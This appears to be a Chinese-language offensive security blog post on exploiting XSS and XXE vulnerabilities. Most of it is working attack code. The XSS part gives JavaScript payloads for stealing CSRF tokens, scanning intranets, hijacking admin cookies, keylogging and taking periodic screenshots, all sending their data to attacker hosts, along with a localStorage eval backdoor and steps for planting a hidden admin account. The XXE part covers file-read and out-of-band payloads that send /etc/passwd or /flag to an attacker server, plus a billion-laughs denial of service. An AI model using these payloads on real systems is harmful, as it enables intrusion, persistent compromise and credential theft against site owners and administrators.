<h4 id="盗用-CSRF-Token"><a href="#盗用-CSRF-Token" class="headerlink" title="盗用 CSRF Token"></a><strong>盗用 CSRF Token</strong></h4><p>许多网站使用 CSRF Token 来防御跨站请求伪造攻击。但如果存在 XSS 漏洞，攻击者可以轻松地通过 JavaScript 获取页面中的 CSRF Token，然后构造一个合法的请求（例如，转账请求），并代表用户提交</p>
<p>恶意代码示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 通过 AJAX 请求获取页面内容</span></span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&#x27;/user/profile&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">html</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 从 HTML 中解析 CSRF Token，并构造一个请求</span></span><br><span class="line">    <span class="keyword">const</span> csrfToken = html.<span class="title function_">match</span>(<span class="regexp">/csrf-token&quot; content=&quot;(.*?)&quot;&gt;/</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/transfer&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">body</span>: <span class="string">`amount=1000&amp;to=attacker&amp;_csrf=<span class="subst">$&#123;csrfToken&#125;</span>`</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="DOM篡改"><a href="#DOM篡改" class="headerlink" title="DOM篡改"></a>DOM篡改</h4><p>攻击者可以修改页面上的 DOM 元素，例如，隐藏或替换页面上的某些内容，或者插入广告、恶意链接等</p>
<h2 id="xss怎么打内网"><a href="#xss怎么打内网" class="headerlink" title="xss怎么打内网"></a>xss怎么打内网</h2><p><strong>扫端口</strong><br>最基础也最常见的利用方式。攻击者可以通过 JavaScript 构造请求（如 <code>&lt;img&gt;</code> 或 <code>&lt;iframe&gt;</code> 标签），尝试加载内网 IP 地址和端口，并根据加载成功或失败来判断端口是否开放<br><strong>基本思路：</strong></p>
<ul>
<li><strong>加载</strong> <code>&lt;img&gt;</code> <strong>标签</strong>： <code>&lt;img&gt;</code> 标签的 <code>src</code> 属性可以指向内网 IP 和端口。如果图片能够加载成功，就说明该端口是开放的。可以通过 <code>onerror</code> 和 <code>onload</code> 事件来判断加载结果</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> targetIp = <span class="string">&#x27;192.168.1.1&#x27;</span>;  </span><br><span class="line"><span class="keyword">const</span> targetPorts = [<span class="number">80</span>, <span class="number">22</span>, <span class="number">445</span>, <span class="number">8080</span>];</span><br><span class="line"></span><br><span class="line">targetPorts.<span class="title function_">forEach</span>(<span class="function"><span class="params">port</span> =&gt;</span> &#123;  </span><br><span class="line"><span class="keyword">const</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();  </span><br><span class="line">img.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;  </span><br><span class="line"><span class="comment">// 端口开放  </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Port <span class="subst">$&#123;port&#125;</span> on <span class="subst">$&#123;targetIp&#125;</span> is open.`</span>);  </span><br><span class="line"><span class="comment">// 将结果发送回攻击者服务器  </span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">`http://attacker.com/log?ip=<span class="subst">$&#123;targetIp&#125;</span>&amp;port=<span class="subst">$&#123;port&#125;</span>&amp;status=open`</span>);  </span><br><span class="line">&#125;;  </span><br><span class="line">img.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;  </span><br><span class="line"><span class="comment">// 端口关闭或无法访问  </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Port <span class="subst">$&#123;port&#125;</span> on <span class="subst">$&#123;targetIp&#125;</span> is closed.`</span>);  </span><br><span class="line">&#125;;  </span><br><span class="line">img.<span class="property">src</span> = <span class="string">`http://<span class="subst">$&#123;targetIp&#125;</span>:<span class="subst">$&#123;port&#125;</span>`</span>;  </span><br><span class="line">&#125;);  </span><br></pre></td></tr></table></figure>

<ul>
<li><strong>加载</strong> <code>&lt;iframe&gt;</code> <strong>标签</strong>： <code>&lt;iframe&gt;</code> 标签可以用来加载内网页面。如果加载成功，攻击者可以通过 JavaScript 获取页面的部分内容（但受同源策略限制）</li>
</ul>
<p><strong>服务指纹识别</strong><br>通过端口扫描后，可以确定内网中有哪些服务是开放的。接下来，可以通过 JavaScript 发送 AJAX 请求到这些服务，然后根据响应头（如 <code>Server</code>、<code>X-Powered-By</code>）或页面内容来识别服务的类型和版本</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> targetUrl = <span class="string">&#x27;http://192.168.1.1:8080&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(targetUrl)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 检查响应头，获取服务信息</span></span><br><span class="line">    <span class="keyword">const</span> serverHeader = response.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Server&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server on <span class="subst">$&#123;targetUrl&#125;</span> is: <span class="subst">$&#123;serverHeader&#125;</span>`</span>);</span><br><span class="line">    <span class="comment">// 将结果发送回攻击者服务器</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">`http://attacker.com/log?url=<span class="subst">$&#123;targetUrl&#125;</span>&amp;server=<span class="subst">$&#123;serverHeader&#125;</span>`</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Could not connect to <span class="subst">$&#123;targetUrl&#125;</span>`</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p><strong>攻击内网路由器或管理后台</strong><br>许多内网路由器和管理系统都存在默认密码或已知漏洞。攻击者可以利用 XSS 漏洞，在受害者浏览器中构造并发送针对这些设备的请求</p>
<p><strong>示例：利用 CSRF 漏洞修改路由器密码</strong><br>假设某个路由器修改密码的请求是：<code>POST /admin/password_change</code>，并带上参数 <code>new_password=123456</code>。 攻击者可以通过 JavaScript 构造一个表单并提交，或者直接用 <code>fetch</code> 发送请求</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设路由器IP是 192.168.1.1，并且修改密码的路径是 /admin/change_password</span></span><br><span class="line"><span class="keyword">const</span> routerIp = <span class="string">&#x27;192.168.1.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> newPassword = <span class="string">&#x27;hacked_by_xss&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;password&#x27;</span>, newPassword);</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">`http://<span class="subst">$&#123;routerIp&#125;</span>/admin/change_password`</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: formData</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Router password changed!&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>HttpOnly。当一个网站允许TRACE亲求是间，可以按照下面的步骤攻击</p>
<p>1.构造一个恶意链接或访问一个恶意脚本の页面<br>2.恶意脚本向受害者的浏览器发一个TRACE请求<br>3.如果服务器没有正确的配置。他可能会在trace响应中包含所有HTTP请求头，包括带有httponly标志的cookie<br>4.恶意脚本通过js读取trace的内容，从而获取到cookie</p>
<p>防御：禁用HTTP的trace和track方法，现在的服务器默认禁用了这些方法</p>
<h2 id="有shell的情况怎么xss实现对目标长久控制"><a href="#有shell的情况怎么xss实现对目标长久控制" class="headerlink" title="有shell的情况怎么xss实现对目标长久控制"></a>有shell的情况怎么xss实现对目标长久控制</h2><h3 id="xss劫持管理员会话"><a href="#xss劫持管理员会话" class="headerlink" title="xss劫持管理员会话"></a>xss劫持管理员会话</h3><p>这是最直接的xss<br>当管理员访问xss漏洞的页面，我们的恶意js代码会执行，并窃取管理员的cookie，sessionStorage，localStorage等会话信息</p>
<p><strong>实现</strong><br><strong>webshell注入</strong><br>在你获取的shell页面找一个管理员经常访问的，可写入的文件，例如网站的公共js文件，后台管理页面模板等</p>
<p><strong>插入payload</strong><br>在改文件插入恶意js代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://your-evil-server.com/log.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure>

<p><strong>获取会话</strong><br>当管理员访问该页面时，他们的 <code>cookie</code> 就会被发送到您的服务器 <code>log.php</code>。您可以用这些 <code>cookie</code> 伪造会话，从而以管理员身份登录后台</p>
<p><strong>持久化</strong><br>只要您能以管理员身份登录，就可以通过后台修改网站配置，上传新的 WebShell，或者进行其他持久化操作</p>
<h3 id="xss注入后台管理页面后门"><a href="#xss注入后台管理页面后门" class="headerlink" title="xss注入后台管理页面后门"></a>xss注入后台管理页面后门</h3><p>这种方法更隐蔽持久，它直接在<strong>后台创建可控的后门</strong><br><strong>原理</strong>：很多后台管理管理系统允许管理员自定义页面内容，插入自定义代码或编辑模板</p>
<p><strong>实现：</strong><br>先进后台再说</p>
<p><strong>自动化操作：</strong><br>写js脚本，该脚本可以模拟管理员的点击，表单填写和提交操作</p>
<p><strong>创建新用户</strong><br>脚本可以模拟点击添加新用户的按钮，填写一个新的管理员账户信息<br>例如，用户名：backdoor，密码：pppaaasss，然后保存</p>
<p><strong>修改配置文件</strong><br>模拟打开系统设置，修改网站配置。允许文件上传，关闭安全限制</p>
<p><strong>注入payload</strong><br>自动化操作js代码注入xss页面，当管理员访问脚本会在后台静默执行，完成上述操作</p>
<h3 id="xss-劫持websocket连接"><a href="#xss-劫持websocket连接" class="headerlink" title="xss 劫持websocket连接"></a>xss 劫持websocket连接</h3><p>如果目标网站使用了 WebSocket 来进行实时通信，这也是一个非常高明的攻击点<br><strong>原理：</strong> WebSocket 是一种在客户端和服务器之间建立持久连接的协议。我们可以利用 XSS，劫持 WebSocket 连接，向服务器发送恶意指令<br><strong>实现</strong><br>注入websocket代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 假设原始 WebSocket 连接</span><br><span class="line">var ws = new WebSocket(&quot;wss://target.com/websocket&quot;);</span><br><span class="line">// 劫持</span><br><span class="line">ws.onmessage = function(event) &#123;</span><br><span class="line">// 在这里可以拦截或修改 WebSocket 消息</span><br><span class="line">console.log(&quot;Received message from server: &quot; + event.data);</span><br><span class="line">&#125;;</span><br><span class="line">// 发送恶意指令</span><br><span class="line">ws.onopen = function() &#123;</span><br><span class="line">// 假设服务器允许通过 WebSocket 发送命令</span><br><span class="line">ws.send(JSON.stringify(&#123; &quot;command&quot;: &quot;upload_shell&quot;, &quot;path&quot;: &quot;/uploads/backdoor.php&quot; &#125;));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>持久化</strong><br>当管理员访问该页面，我们可以检查LOCALstorage的标志。如果存在则执行后续的恶意操作（例如加载远程执行js文件）</p>
<p> <strong>键盘记录</strong><br><strong>原理：</strong> 键盘记录器利用 JavaScript 监听 DOM 事件，例如 <code>keydown</code> 或 <code>keypress</code>，当管理员在后台页面输入账号、密码或其他敏感信息时，脚本会捕获这些按键事件，并将输入的数据发送到攻击者的服务器</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 恶意键盘记录脚本  </span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;  </span><br><span class="line"><span class="keyword">var</span> key = event.<span class="property">key</span>;  </span><br><span class="line"><span class="comment">// 将按键数据发送到你的服务器  </span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://your-evil-server.com/log.php?key=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(key));  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p><strong>实时数据捕获：</strong> 当管理员在后台登录表单中输入用户名和密码时，每个按键都会被记录下来，并通过 <code>fetch</code> 请求发送到您的服务器<br><strong>持久化：</strong> 这种方法非常隐蔽，因为脚本在后台静默运行。一旦管理员登录，您不仅能获取他们的账号密码，还能实时监控他们在后台进行的任何操作，例如修改文章、上传文件等</p>
<h3 id="浏览器屏幕截图"><a href="#浏览器屏幕截图" class="headerlink" title="浏览器屏幕截图"></a><strong>浏览器屏幕截图</strong></h3><p><strong>原理：</strong> 利用 HTML5 的 <code>Canvas</code> 和 <code>toDataURL()</code> 方法，我们可以截取 DOM 元素（例如整个页面）的内容，将其转换为图片数据，并发送给攻击者<br><strong>实现：</strong><br><strong>注入 Payload：</strong> 在可写入的 JS 文件中注入以下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定时截图并发送  </span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;  </span><br><span class="line"><span class="title function_">html2canvas</span>(<span class="variable language_">document</span>.<span class="property">body</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">canvas</span>) &#123;  </span><br><span class="line"><span class="comment">// 将 canvas 内容转换为 base64 格式  </span></span><br><span class="line"><span class="keyword">var</span> imageData = canvas.<span class="title function_">toDataURL</span>(<span class="string">&quot;image/png&quot;</span>);  </span><br><span class="line"><span class="comment">// 将图片数据发送到你的服务器  </span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://your-evil-server.com/screenshot.php&#x27;</span>, &#123;  </span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span><br><span class="line"><span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">image</span>: imageData &#125;)  </span><br><span class="line">&#125;);  </span><br><span class="line">&#125;);  </span><br><span class="line">&#125;, <span class="number">5000</span>); <span class="comment">// 每隔5秒截图一次</span></span><br></pre></td></tr></table></figure>

<p><strong>依赖库：</strong> 需要注意的是，这个方法通常依赖第三方库，例如 <code>html2canvas.js</code>。您需要将该库的 JS 文件也注入到目标网站中<br><strong>实时监控：</strong> 这种方法可以直观地看到管理员在后台的操作界面，包括他们正在编辑的内容、正在上传的文件等，为您的后续攻击提供丰富的上下文信息。</p>
<h3 id="利用-XSS-注入持久化-localStorage-后门"><a href="#利用-XSS-注入持久化-localStorage-后门" class="headerlink" title="利用 XSS 注入持久化 localStorage 后门"></a><strong>利用 XSS 注入持久化 localStorage 后门</strong></h3><p>这是一种更具隐蔽性的持久化方法，它不依赖于修改网站文件，而是利用浏览器的本地存储功能<br><strong>原理：</strong> 利用 <code>localStorage</code> 将恶意代码片段持久化存储在管理员的浏览器中<br><strong>实现：</strong><br><strong>一次性注入：</strong> 找到一个XSS漏洞点（例如，一个输入框）。输入以下Payload：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  </span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;backdoor&#x27;</span>, <span class="string">&#x27;your_malicious_javascript_code&#x27;</span>);  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p><strong>主页面加载器：</strong> 然后在网站的主 JS 文件中，注入一个检查 <code>localStorage</code> 的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查是否存在后门代码  </span></span><br><span class="line"><span class="keyword">var</span> backdoorCode = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;backdoor&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (backdoorCode) &#123;  </span><br><span class="line"><span class="built_in">eval</span>(backdoorCode); <span class="comment">// 执行后门代码  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>持久化：</strong> 只要管理员不清空浏览器缓存，即使您修改的输入框被清理了，后门代码依然会存在于 <code>localStorage</code> 中，并在每次页面加载时被执行</p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>可利用外部实体读取服务器上的任意文件，例如&#x2F;etc&#x2F;passwd  ，web应用配置文件<br><strong>利用原理</strong>：攻击者在XML文档中定义一个外部实体，实体的值为一个本地文件路径。当XML解析器解析该实体时，就会去读取并返回该文件的内容<br><strong>利用</strong><br>1.先构造恶意dtd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://10.88.15.58:7777?p=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">//攻击者的服务器地址，%file;会被替换为第一步读取的/flag文件内容</span><br><span class="line">%int; //引用 int 实体，注册 send 实体</span><br><span class="line">%send;  //触发 send 实体，外带数据</span><br><span class="line"></span><br><span class="line">//文件读取 + 数据外带</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br></pre></td></tr></table></figure>

<p>2.引用实体<br>在 XML 文档的主体中引用该实体<br>例如：<code>&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></p>
<p>完整示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line">]&gt;  </span><br><span class="line">&lt;root&gt;  </span><br><span class="line">&lt;data&gt;&amp;xxe;&lt;/data&gt;  </span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>当服务器解析这个 XML 时，在 <code>&lt;data&gt;</code> 标签中就会回显 <code>/etc/passwd</code> 文件的内容</p>
<h4 id="拒绝服务攻击（Dos）"><a href="#拒绝服务攻击（Dos）" class="headerlink" title="拒绝服务攻击（Dos）"></a>拒绝服务攻击（Dos）</h4><p>利用XXE，通过递归或大量实体引用，使XML解析器进入死循环或消耗大量系统资源，从而导致服务崩溃</p>
<p>今典示例：十亿笑脸</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个 XML 文件虽然很小，但在解析时，<code>&lt;lolz&gt;</code> 实体会扩展为数十亿个“lol”，消耗巨大的内存和 CPU 资源，最终导致服务器崩溃</p>
<h4 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h4><p>利用XXE扫描内网开发的端口</p>
<p><strong>利用原理</strong>：攻击者构造外部实体，让 XML 解析器去尝试连接内网 IP 和端口。如果端口开放，XML 解析会成功或返回特定的错误信息；如果端口关闭，则会返回连接超时等错误，通过错误信息来判断端口状态</p>
<p><strong>利用</strong><br>定义外部实体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY scan SYSTEM &quot;http://内网IP&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>发送请求</strong>：让服务器去访问内网IP的端口<br>观察响应：如果服务器返回了“连接被拒绝”等信息，说明端口是关闭的，如果返回了“链接超时”或成功连接，则说明端口可能是开发的</p>
<p><strong>观察响应</strong>：如果服务器放回来“连接被拒绝”等信息，说明端口是关闭的，如果出现<strong>连接超时</strong>或者连接成功，则说明端口可能是开放的</p>
<h4 id="盲-XXE（Blind-XXE）"><a href="#盲-XXE（Blind-XXE）" class="headerlink" title="盲 XXE（Blind XXE）"></a>盲 XXE（Blind XXE）</h4><p>如果服务器没有将 XML 解析结果回显到前端，攻击者就无法直接看到文件内容，这时就需要利用<strong>带外（Out-of-Band）通信</strong>来获取信息</p>
<p>利用原理：攻击者利用外部实体向自己的服务器发送请求，并在 URL 中携带需要读取的文件内容</p>
<p>利用步骤：</p>
<p>构造外部实体：攻击者在自己的服务器上搭建一个 HTTP 服务来监听请求<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % exfiltrate &quot;&lt;!ENTITY % send SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>远程引用：在主 XML 中引用攻击者的 DTD 文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>当服务器解析这个 DTD 时，就会将 &#x2F;etc&#x2F;passwd 文件的内容发送到攻击者的服务器上</p>
<h2 id="XXE盲注"><a href="#XXE盲注" class="headerlink" title="XXE盲注"></a>XXE盲注</h2><h4 id="带外请求（OOB）"><a href="#带外请求（OOB）" class="headerlink" title="带外请求（OOB）"></a>带外请求（OOB）</h4><p>先确认是否存在XXR漏洞，即使没有回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">准备dns服务器</span><br><span class="line">推荐用下面这个dnslog和ceye感觉都不怎么好用</span><br><span class="line">https://requestrepo.com/</span><br><span class="line"></span><br><span class="line">使用VPS的python的http</span><br><span class="line">python3 -m http.server port</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289593092-20727264-1236-4c41-ba98-36e739016c21.jpg" referrerpolicy="no-referrer" alt="null"></p>
<p><strong>发送请求：</strong> 将上述 XML 作为请求体发送到目标服务<br><strong>确认存在漏洞：</strong> 如果你的服务器收到了来自目标 IP 的 <code>GET /test</code> 请求，就说明服务器存在 XXE 漏洞</p>
